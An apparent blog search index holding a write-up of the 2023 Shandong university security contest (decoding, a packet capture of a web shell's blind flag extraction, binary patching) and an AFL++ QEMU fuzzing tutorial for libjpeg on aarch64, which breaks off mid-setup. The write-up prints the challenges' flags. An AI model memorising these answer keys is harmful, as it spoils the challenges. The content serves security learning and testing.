<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023 山东省大学生网络安全技能大赛 复盘</title>
    <url>/2023/10/23/23sdnisc/</url>
    <content><![CDATA[<h1 id="2023-网安省赛复盘"><a href="#2023-网安省赛复盘" class="headerlink" title="2023 网安省赛复盘"></a>2023 网安省赛复盘</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>AiDai👴🏻🐂🍺</li>
</ul>
<h2 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="Misc - 签到"></a>Misc - 签到</h2><p>下载附件得到游戏地址，随便玩了三四关发现一共 17 关，👴🏻懒的打了，网页源码中发现注释的 <code>index.js</code>，搜 flag 有个 flag 函数，里头就有 flag：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231023221659202.png" alt="image-20231023221659202"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+=&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> cars = [<span class="number">25</span>, <span class="number">38</span>, <span class="number">49</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">55</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">51</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="number">52</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">38</span>, <span class="number">13</span>, <span class="number">54</span>, <span class="number">4</span>, <span class="number">52</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">55</span>, <span class="number">12</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">38</span>, <span class="number">16</span>, <span class="number">49</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">54</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">12</span>, <span class="number">55</span>, <span class="number">52</span>, <span class="number">63</span>];</span><br><span class="line"><span class="keyword">let</span> ff = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> iii = <span class="number">0</span>; iii &lt; cars.<span class="property">length</span>; iii++) &#123;</span><br><span class="line">    ff = ff + r[cars[iii]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*this is flag*/</span></span><br></pre></td></tr></table></figure>

<p>扔到控制台里头🏃🏻‍♀️：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231023221716239.png" alt="image-20231023221716239"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZmxhZ3tlMWYyMzYzNDQ0NmZmN2E0NTU3MmIzMmQxOWI2NjlhM30=</span><br></pre></td></tr></table></figure>

<p>base64 解码得 flag</p>
<h2 id="Misc-啊吧啊吧的数据包"><a href="#Misc-啊吧啊吧的数据包" class="headerlink" title="Misc - 啊吧啊吧的数据包"></a>Misc - 啊吧啊吧的数据包</h2><p>通过筛选 POST 请求发现有 shell 交互：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231023221757948.png" alt="image-20231023221757948"></p>
<p>解码 base64 发现这是一个查看 flag 的操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo Y2F0IGZsYWdfMTI2NDQzMTI= | base64 -d   </span><br><span class="line">cat flag_12644312</span><br></pre></td></tr></table></figure>

<p>再结合后面的命令，这个 shell 在逐个字符爆破 flag，采用时间盲注，那么筛选这一段的 http 流数据（30147 - 35661），导出为 csv 便于 python 处理，删掉多余的列之后，保留 value 和时间, 写脚本处理即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data_out.csv&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    now_num = <span class="number">1</span></span><br><span class="line">    now_index = <span class="string">&quot;cut -c&#123;:d&#125;&quot;</span></span><br><span class="line">    old_line = <span class="string">&quot;&quot;</span></span><br><span class="line">    attack_time = <span class="number">0</span></span><br><span class="line">    response_time = <span class="number">0</span></span><br><span class="line">    pattern = <span class="string">&quot;cut -c\d+\) = \&#x27;(.)\&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t, payload = line.strip().split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> payload == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                response_time = <span class="built_in">float</span>(t)</span><br><span class="line">                <span class="comment"># print(attack_time, response_time)</span></span><br><span class="line">                <span class="keyword">if</span> response_time - attack_time &gt;= <span class="number">3</span>:</span><br><span class="line">                    xxx = re.findall(pattern=pattern, string=old_line)</span><br><span class="line">                    <span class="built_in">print</span>(xxx[<span class="number">0</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                attack_time = <span class="built_in">float</span>(t)</span><br><span class="line">                old_line = line.strip()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h2 id="Misc-我应该去爱你"><a href="#Misc-我应该去爱你" class="headerlink" title="Misc - 我应该去爱你"></a>Misc - 我应该去爱你</h2><p>扔到 Audacity 里看频谱，这玩意考眼神：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231023222109483.png" alt="image-20231023222109483"></p>
<p>猜了好几遍才猜对，眼神不行了😅</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;dfcba866efb361d89b7240c49653a782&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Misc-简单编码-补"><a href="#Misc-简单编码-补" class="headerlink" title="Misc - 简单编码(补)"></a>Misc - 简单编码(补)</h2><ul>
<li>比赛日下午脑子一团浆糊，最后十几分钟才意识到这玩意是不是 二进制和八进制</li>
<li>然后写脚本，寄在这个根据长度判断是二进制还是八进制（但凡判断条件里头加上个 <code>=</code> 就出 flag 了）<ul>
<li>出来的字符串先 base64 解码，然后 base32 解码，最后 hex2str</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./e949a66de57a5411f5e9935442787a5b.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) &lt;= <span class="number">4</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">8</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    flag = base64.b64decode(flag)</span><br><span class="line">    flag = base64.b32decode(flag)</span><br><span class="line">    flag = binascii.a2b_hex(flag)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


<h2 id="Misc-神秘的-base-补"><a href="#Misc-神秘的-base-补" class="headerlink" title="Misc - 神秘的 base(补)"></a>Misc - 神秘的 base(补)</h2><ul>
<li>👴🏻之前没用过 base 换表，不晓得怎么改，找 b64decode 源码改了一通也不行<ul>
<li>原来只需要 translate 就行😅</li>
</ul>
</li>
<li>后续补的脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeB64</span>(<span class="params">text</span>):</span><br><span class="line">    old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    l = <span class="string">&quot;OYiv05&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">all</span> = itertools.permutations(l, <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">        item = <span class="string">&quot;&quot;</span>.join(item)</span><br><span class="line">        table = <span class="string">&quot;xbQTZqjN8ERuwlzVfUIrPkeHd&#123;&#125;LK697o2pSsGD+ncgm3CBh/Xy1MF4JAWta&quot;</span>.<span class="built_in">format</span>(item)</span><br><span class="line">        decoded = base64.b64decode(text.translate(text.maketrans(old_table, table)))</span><br><span class="line">        <span class="keyword">if</span> decoded.endswith(<span class="string">b&quot;&#125;&quot;</span>) <span class="keyword">and</span> decoded.isascii():</span><br><span class="line">            <span class="built_in">print</span>(decoded)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encoded_flag = <span class="string">&quot;EvAzEwo6E9RO4qSAHq42E9KvEv5zHDt34GtdHGJaHD7NHG42bwd=&quot;</span></span><br><span class="line">    DecodeB64(encoded_flag)</span><br></pre></td></tr></table></figure>






<h2 id="Crypto-小试牛刀"><a href="#Crypto-小试牛刀" class="headerlink" title="Crypto - 小试牛刀"></a>Crypto - 小试牛刀</h2><p>给的密文：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipfm\x82Kj]p~l?\x82ogw\x85mt[K\x8br\x97</span><br></pre></td></tr></table></figure>

<p>猜测是根据 flag{} 进行变换的</p>
<p>那么找规律发现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">11</span>]: <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">Out[<span class="number">11</span>]: -<span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">Out[<span class="number">12</span>]: -<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>写解题脚本得到 flag：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = <span class="string">b&quot;ipfm\x82Kj]p~l?\x82ogw\x85mt[K\x8br\x97&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(d):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v-i-<span class="number">3</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;CaSer_1s_VerY_E4sY&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Reverse-人生模拟-补"><a href="#Reverse-人生模拟-补" class="headerlink" title="Reverse - 人生模拟(补)"></a>Reverse - 人生模拟(补)</h2><ul>
<li>👴🏻好久不用 Ghidra 的 patch，给忘了导出要选 ELF（👴🏻选的Binary，👴🏻脑子瓦特了），就说怎么 patch 的程序直接执行不了</li>
</ul>
<p>简单看了看程序逻辑，猜测 flag 会在 FUN_0040350f 函数中打印出来，想要执行到这里必须要活到 60 岁，在主函数中的 while 循环里的 FUN_00403914 函数应该是获取当前的年龄：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231024160930613.png" alt="image-20231024160930613" style="zoom:50%;" />

<p>这个函数长这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00403914</span> <span class="number">55</span>              PUSH       RBP</span><br><span class="line"><span class="number">00403915</span> <span class="number">48</span> <span class="number">89</span> e5        MOV        RBP,RSP</span><br><span class="line"><span class="number">00403918</span> <span class="number">48</span> <span class="number">89</span> <span class="number">7</span>d f8     MOV        qword ptr [RBP + local_10],RDI</span><br><span class="line"><span class="number">0040391</span>c <span class="number">48</span> <span class="number">8b</span> <span class="number">45</span> f8     MOV        RAX,qword ptr [RBP + local_10]</span><br><span class="line"><span class="number">00403920</span> <span class="number">8b</span> <span class="number">40</span> <span class="number">04</span>        MOV        EAX,dword ptr [RAX + <span class="number">0x4</span>]</span><br><span class="line"><span class="number">00403923</span> <span class="number">5</span>d              POP        RBP</span><br><span class="line"><span class="number">00403924</span> c3              RET</span><br><span class="line"><span class="number">00403925</span> <span class="number">90</span>              ??         <span class="number">90</span>h</span><br><span class="line"></span><br><span class="line">undefined4 <span class="title function_">FUN_00403914</span><span class="params">(<span class="type">long</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(param_1 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那直接 patch, 直接返回 60:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00403914</span> <span class="number">55</span>              PUSH       RBP</span><br><span class="line"><span class="number">00403915</span> <span class="number">48</span> <span class="number">89</span> e5        MOV        RBP,RSP</span><br><span class="line"><span class="number">00403918</span> <span class="number">48</span> <span class="number">89</span> <span class="number">7</span>d f8     MOV        qword ptr [RBP + local_10],RDI</span><br><span class="line"><span class="number">0040391</span>c <span class="number">48</span> c7 c0        MOV        RAX,<span class="number">0x3c</span></span><br><span class="line">            <span class="number">3</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00403923</span> <span class="number">5</span>d              POP        RBP</span><br><span class="line"><span class="number">00403924</span> c3              RET</span><br><span class="line"><span class="number">00403925</span> <span class="number">90</span>              ??         <span class="number">90</span>h</span><br><span class="line"></span><br><span class="line">undefined8 <span class="title function_">get_age</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x3c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 <code>FUN_0040350f</code> 函数里有这样的条件判断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((((<span class="number">0</span> &lt; param_2) &amp;&amp; (<span class="number">0</span> &lt; param_3)) &amp;&amp; (<span class="number">0</span> &lt; param_4)) &amp;&amp;</span><br><span class="line">   (((<span class="number">0</span> &lt; param_5 &amp;&amp; (param_1 == <span class="number">0x3c</span>)) &amp;&amp; (local_f0 == <span class="number">0x11120c94</span>))))</span><br></pre></td></tr></table></figure>

<p>直接把对应条件判断指令反过来写, 改完:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((((<span class="literal">true</span>) &amp;&amp; (<span class="literal">true</span>)) &amp;&amp; (<span class="literal">true</span>)) &amp;&amp; (((<span class="literal">true</span> &amp;&amp; (param_1 == <span class="number">60</span>)) &amp;&amp; (local_f0 != <span class="number">0x11120c94</span>))))</span><br></pre></td></tr></table></figure>

<p>Patch 完直接导出 ELF 文件, 运行之后崩溃在了 <code>0x4035de</code> 处（<code>idiv   rcx</code>, 此时 rcx 是 0），直接 nop 掉，重新导出运行就能拿到flag：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> ./simulation2</span><br><span class="line">==============================================================================</span><br><span class="line">||                                                                          ||</span><br><span class="line">||               It&#x27;s another year of Shandong competition.                 ||</span><br><span class="line">||                    Welcome to the life simulator                         ||</span><br><span class="line">||                                                                          ||</span><br><span class="line">||                           author: Mr_hello                               ||</span><br><span class="line">||                                                                          ||</span><br><span class="line">||                                                                          ||</span><br><span class="line">==============================================================================</span><br><span class="line">你出生了,你是一名男孩</span><br><span class="line">flag&#123;76bce138e9f529db4d684e1d5e7875e4&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL++ QEMU mode (aarch64)</title>
    <url>/2024/06/18/AFLplusplus-QEMU-enchanced/</url>
    <content><![CDATA[<h1 id="AFL-QEMU-mode-（aarch64）高级应用"><a href="#AFL-QEMU-mode-（aarch64）高级应用" class="headerlink" title="AFL++ QEMU mode （aarch64）高级应用"></a>AFL++ QEMU mode （aarch64）高级应用</h1><blockquote>
<p>参考资料: </p>
<ul>
<li><a href="https://antel0p3.github.io/2023/07/20/AFL-QEMU/">使用 AFL++-QEMU 和 LIBPROTOBUF 的高级二进制模糊：语法感知和内存中持续模糊的实际案例</a></li>
<li><a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.persistent.md">How to use the persistent mode in AFL++’s QEMU mode</a></li>
</ul>
</blockquote>
<p>AFL++ 的 QEMU 模式在物联网（IoT）和车联网（V2X）领域有着重要的应用。由于这些设备和系统通常包含大量闭源软件，且运行在多种不同架构上（如 ARM、MIPS 等），传统的源代码插桩方法往往不可行。利用 QEMU 模式，AFL++ 能够在不需要源代码的情况下直接对这些设备的固件或二进制文件进行模糊测试。</p>
<p>但 QEMU 模式的执行速度比编译时插桩模式慢得多，因为 QEMU 模式需要进行二进制翻译和仿真，而这些操作比直接运行编译过的插桩代码要耗费更多的时间和资源。</p>
<p>为了优化提升 QEMU mode 测试效率，我们可以通过对下述环境变量进行配置，具体内容可参考<a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.md">官方说明文档</a></p>
<ul>
<li><p>插桩和覆盖率：</p>
<ul>
<li><code>AFL_INST_LIBS</code> （如果需要对使用的库进行插桩，可启用该选项）</li>
<li><code>AFL_QEMU_INST_RANGES</code> （用于指定插桩的地址范围）</li>
</ul>
</li>
<li><p>突变：</p>
<ul>
<li><code>AFL_CUSTOM_MUTATOR_LIBRARY</code></li>
<li><code>AFL_CUSTOM_MUTATOR_ONLY</code></li>
</ul>
</li>
<li><p>变异：</p>
<ul>
<li><code>AFL_ENTRYPOINT</code></li>
<li><code>AFL_QEMU_PERSISTENT_ADDR</code>&#x2F; <code>AFL_QEMU_PERSISTENT_ADDR_RET</code></li>
<li><code>AFL_QEMU_PERSISTENT_HOOK</code></li>
<li><code>AFL_DISABLE_TRIM</code></li>
<li><code>AFL_DEBUG</code>&#x2F; <code>AFL_DEBUG_CHILD</code></li>
</ul>
</li>
</ul>
<p>本文将以 <a href="https://github.com/ChijinZ/security_advisories/tree/master/libjpeg-v9a">libjpeg</a> 为例，在 aarch64 架构下进行编译与测试，测试目标是 libjpeg 库中自带的 cjpeg 程序。它是一个二进制文件，能够将输入的图片文件转换为 jpeg 文件。</p>
<p>编译目标程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按照交叉编译环境</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install gcc-aarch64-linux-gnu</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成 Makefile</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure --prefix=<span class="string">&quot;<span class="subst">$(pwd)</span>/install&quot;</span> --enable-shared --enable-static CC=aarch64-linux-gnu-gcc --host=aarch64-linux</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make -j &amp;&amp; make install</span></span><br></pre></td></tr></table></figure>

<p>运行（AFL++ 的 QEMU mode 已经预先编译安装完成(aarch64)）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">QEMU_LD_PREFIX=/usr/aarch64-linux-gnu LD_LIBRARY_PATH=./install/lib afl-qemu-trace ./install/bin/cjpeg -h</span></span><br><span class="line">usage: ./cjpeg [switches] [inputfile]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<ul>
<li>种子应当寻找对应的合法类型文件，例如这里可以寻找 ppm 类型样例文件<ul>
<li>这里由于程序较简单，种子只写了一个 a，任其随机变异</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd install</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建种子文件</span></span><br><span class="line">mkdir input &amp;&amp; echo a &gt; input/test</span><br></pre></td></tr></table></figure>

<ul>
<li>由于该程序是动态链接的，且使用了 libjpeg.so 库，在对其进行模糊测试时需要装载：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">fuzz.sh 文件内容:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置 ld 路径</span></span><br><span class="line">export QEMU_LD_PREFIX=/usr/aarch64-linux-gnu</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定 libjpeg.so 所在的路径</span></span><br><span class="line">export LD_LIBRARY_PATH=./lib</span><br><span class="line">afl-fuzz -i ./input -o ./output -Q -m 10240 -- ./bin/cjpeg @@</span><br></pre></td></tr></table></figure>

<p>发现第一个 crash 用时 44s，exec speed 在 700 ~ 1000&#x2F;sec 浮动：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202408130857834.png" alt="image-20240617100028263" style="zoom:80%;" />

<h2 id="入口点更改"><a href="#入口点更改" class="headerlink" title="入口点更改"></a>入口点更改</h2><p>默认情况下，AFL++ 会自动将程序的入口点设置为 AFL 的入口点（ <code>_start</code> 函数），这种情况下，每次迭代都会完整地运行整个目标</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过开启 AFL_DEBUG 选项查看入口点：</span></span><br><span class="line">[AFL++ ebb70fcf6696] ~/libjpeg/install # AFL_DEBUG=1 ./fuzz.sh | grep entrypoint</span><br><span class="line">AFL forkserver entrypoint: 0x5500001840</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 r2 查询 _start 函数地址:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -c <span class="string">&quot;aa; pdf@0x1840&quot;</span> bin/cjpeg</span></span><br><span class="line">            ;-- _start:</span><br><span class="line">            ;-- pc:</span><br><span class="line">            ; XREFS(30)</span><br><span class="line">┌ 48: entry0 (func rtld_fini, int64_t argc, char **ubp_av); // noreturn</span><br><span class="line">│           ; arg func rtld_fini @ x0</span><br><span class="line">│           ; arg int64_t argc @ sp+0x0</span><br><span class="line">│           ; arg char **ubp_av @ sp+0x8</span><br><span class="line">│           0x00001840      1f2003d5       nop</span><br><span class="line">│           0x00001844      1d0080d2       mov x29, 0</span><br><span class="line">│           0x00001848      1e0080d2       mov x30, 0</span><br><span class="line">│           0x0000184c      e50300aa       mov x5, x0                  ; func rtld_fini</span><br><span class="line">│           0x00001850      e10340f9       ldr x1, [sp]                ; pstate ; int argc</span><br><span class="line">│           0x00001854      e2230091       add x2, ubp_av              ; char **ubp_av</span><br><span class="line">│           0x00001858      e6030091       mov x6, sp                  ; void *stack_end</span><br><span class="line">│           0x0000185c      a00000d0       adrp x0, 0x17000</span><br><span class="line">│           0x00001860      00f847f9       ldr x0, [x0, 0xff0]         ; 0x1480</span><br><span class="line">│                                                                      ; dbg.main ; func main</span><br><span class="line">│           0x00001864      030080d2       mov x3, 0                   ; func init</span><br><span class="line">│           0x00001868      040080d2       mov x4, 0                   ; func fini</span><br><span class="line">└           0x0000186c      89feff97       bl sym.imp.__libc_start_main ; int __libc_start_main(func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end)</span><br></pre></td></tr></table></figure>

<p>接下来使用 <code>AFL_ENTRYPOINT</code> 指定入口点到程序的主函数，跳过 _start 函数中的初始化工作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到 main 函数偏移地址: 0x1480</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -c <span class="string">&quot;aa; afl&quot;</span> bin/cjpeg 2&gt; /dev/null | grep main</span></span><br><span class="line">0x00001290    1     16 sym.imp.__libc_start_main</span><br><span class="line">0x00001480   35    896 main</span><br></pre></td></tr></table></figure>

<p>将偏移地址加上基地址得到最终的目标函数地址（aarch64 架构下，base addr 为 0x5500000000），那么 main 函数的目标地址为：<code>0x5500001480</code></p>
<ul>
<li>对于 amd64: 添加 0x4000000000</li>
<li>对于 x86: 添加 0x40000000</li>
<li>对于 aarch64: 添加 0x5500000000</li>
<li>对于 arm: 无需添加</li>
<li>具体的实际加载地址可以通过 <code>AFL_QEMU_DEBUG_MAPS=1 afl-qemu-trace TARGET-BINARY</code> 查看</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 fuzz.sh 中添加 AFL_ENTRYPOINT 选项</span></span><br><span class="line">export AFL_ENTRYPOINT=0x5500001480</span><br></pre></td></tr></table></figure>

<p>使用同样的种子，发现第一个 crash 用时 28s，exec speed 在 1000~1500&#x2F;sec 浮动</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202408130904840.png" alt="51ygiak3.y5b" style="zoom:80%;" />

<h2 id="持续模式"><a href="#持续模式" class="headerlink" title="持续模式"></a>持续模式</h2><p>“持续模式”是允许 AFL++ 避免每个迭代都调用 <code>fork</code> 的特性。相反，它在到达某个地址（<code>AFL_QEMU_PERSISTENT_ADDR</code>）时保存子节点的状态，并在到达另一个地址（ <code>AFL_QEMU_PERSISTENT_RET</code>）时恢复此状态。（aarch64 架构下无法使用 <code>AFL_QEMU_PERSISTENT_RETADDR_OFFSET</code>）</p>
<ul>
<li>需要注意，<code>AFL_QEMU_PERSISTENT_ADDR</code> 必须指向程序中一个能够循环调用的函数，并且该函数返回后能够再次被调用。</li>
<li>99% 的情况下，需要附加 <code>AFL_QEMU_PERSISTENT_GPR=1</code>（用于恢复通用寄存器的状态，如果不添加该环境变量，第二次迭代循环开始之后会丢失参数值，例如 main 函数的 argc 值将丢失）</li>
</ul>
<p>在 cjpeg 中，我们目前需要重点关注的是解析文件、处理文件部分的函数，计算偏移后指定持续模式的起始地址与返回地址，期望能够持续测试目标部分如下：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202408130914230.png" alt="ytnr04bx.hkh" style="zoom:80%;" />

<ul>
<li>要注意，持续模式起始地址需要囊括读取文件部分（否则无法获取到模糊测试输入数据）</li>
</ul>
<p>在本样例程序中，文件读取、解析操作都在 main 函数中，因此起始地址仍需配置为 main 函数开始，返回地址可以适当前移（文件关闭句柄之前）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export AFL_QEMU_PERSISTENT_ADDR=0x5500001480</span><br><span class="line">export AFL_QEMU_PERSISTENT_RET=0x5500001668</span><br></pre></td></tr></table></figure>

<p>另外需要注意本程序中某个分支下有一个能够导致程序退出的 return，持续模式下如果包含能够导致程序退出的分支，需要指定：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export AFL_QEMU_PERSISTENT_EXITS=1</span><br></pre></td></tr></table></figure>

<ul>
<li>启用该选项后，如果遇到 exit 不会退出程序，而是返回到 START 重新执行</li>
</ul>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202408130914241.png" alt="tptd4hcc.nan" style="zoom:80%;" />

<p>如果执行时如果遇到下述问题，需要考虑修改起始地址、返回地址及上述相关配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[AFL] ERROR: no persistent iteration executed</span><br><span class="line"></span><br><span class="line">[-] Unable to communicate with fork server. Some possible reasons:</span><br><span class="line"></span><br><span class="line">    - You&#x27;ve run out of memory. Use -m to increase the the memory limit</span><br><span class="line">      to something higher than 10240.</span><br><span class="line">    - The binary or one of the libraries it uses manages to create</span><br><span class="line">      threads before the forkserver initializes.</span><br><span class="line">    - The binary, at least in some circumstances, exits in a way that</span><br><span class="line">      also kills the parent process - raise() could be the culprit.</span><br><span class="line">    - If using persistent mode with QEMU, AFL_QEMU_PERSISTENT_ADDR is</span><br><span class="line">      probably not valid (hint: add the base address in case of PIE)</span><br><span class="line"></span><br><span class="line">If all else fails you can disable the fork server via AFL_NO_FORKSRV=1.</span><br><span class="line"></span><br><span class="line">[-] PROGRAM ABORT : Unable to communicate with fork server</span><br><span class="line">         Location : afl_fsrv_run_target(), src/afl-forkserver.c:1990</span><br></pre></td></tr></table></figure>

<p>对样例程序进行模糊测试：</p>
